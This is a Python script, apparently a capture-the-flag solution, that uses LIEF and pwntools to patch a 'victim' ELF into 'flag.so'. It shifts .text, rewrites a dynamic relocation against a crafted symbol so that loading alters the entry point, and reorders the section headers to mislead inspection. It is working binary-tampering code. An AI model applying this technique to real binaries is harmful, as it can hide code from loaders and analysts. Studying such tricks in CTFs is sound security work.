from lief import *
from pwn import u64, u32, u16
from pwn import p64, p32, p16

def load(path: str) -> bytes:
    with open(path, "rb") as f:
        data = f.read()
    return data

def dump(path: str, data: bytes):
    with open(path, "wb+") as f:
        f.write(data)

def replace(dst, start, src):
    return dst[:start] + src + dst[start+len(src):]

class Move:
    def __init__(self, old_index: int, raw: bytes):
        self.old_index = old_index
        self.bytes = raw

def find(sections: list[Move], old: int):
    for i in range(len(sections)):
        if sections[i].old_index == old:
            return i
    raise IndexError

def patch(name: str, victim: str, distance: int, v1: bool = True):
    text_adjust = 0 if v1 else 1 << 32 
    reloc_adjust = -4 if v1 else 0

    elf = ELF.parse(victim)

    elf.header.processor_flag = 0 if v1 else 0x20

    padding = ELF.Segment()
    padding.type = ELF.SEGMENT_TYPES.NULL
    padding = elf.add(padding)

    padding.virtual_address = 0
    padding.virtual_size = elf.segments[0].virtual_address
    padding.file_offset = 0

    text = elf.get_section(".text")
    text.virtual_address += text_adjust
    elf.header.entrypoint += text_adjust
    text.size -= 8

    symname = "adjust entrypoint"
    symbol = ELF.Symbol()
    symbol.name = symname
    symbol.value = 0
    symbol.shndx = ELF.SYMBOL_SECTION_INDEX.ABS
    symbol.type = ELF.SYMBOL_TYPES.NOTYPE

    reloc = elf.dynamic_relocations[0]
    reloc.type = ELF.RELOCATION_X86_64.R64
    reloc.address = 0x18 + reloc_adjust
    reloc.symbol = symbol

    elf.add_dynamic_symbol(symbol)

    elf.write(name)

    elf = ELF.parse(name)

    text = elf.get_section(".text")

    distance = distance // 8
    symbol = next(filter(lambda s: s.name == symname, elf.dynamic_symbols))
    symbol.value = distance * 8 - (elf.entrypoint - text.virtual_address)

    elf.write(name)

    raw = load(name)

    shoff: int = u64(raw[0x28:0x30])
    shsize: int = u16(raw[0x3a:0x3c])
    shnum: int = u16(raw[0x3c:0x3e])
    old_section_names: int = u16(raw[0x3e:0x40])

    print(f"[+] shoff: {shoff}")
    print(f"[+] shnum: {shnum}")
    print(f"[+] shsize: {shsize}")

    sections = [
        Move(i, raw[shoff+i*shsize:shoff+(i+1)*shsize])
        for i in range(shnum)
    ]
    sections = sorted(sections, key=lambda m: u64(m.bytes[0x18:0x20]))

    new_section_names = find(sections, old_section_names)
    for section in sections:
        old_index: int = u32(section.bytes[0x28:0x2c])
        new_index = find(sections, old_index)
        section.bytes = replace(section.bytes, 0x28, p32(new_index))

    sections = map(lambda m: m.bytes, sections)
    sections = b"".join(sections)

    raw = replace(raw, shoff, sections)
    raw = replace(raw, 0x3e, p16(new_section_names))

    dump("flag.so", raw)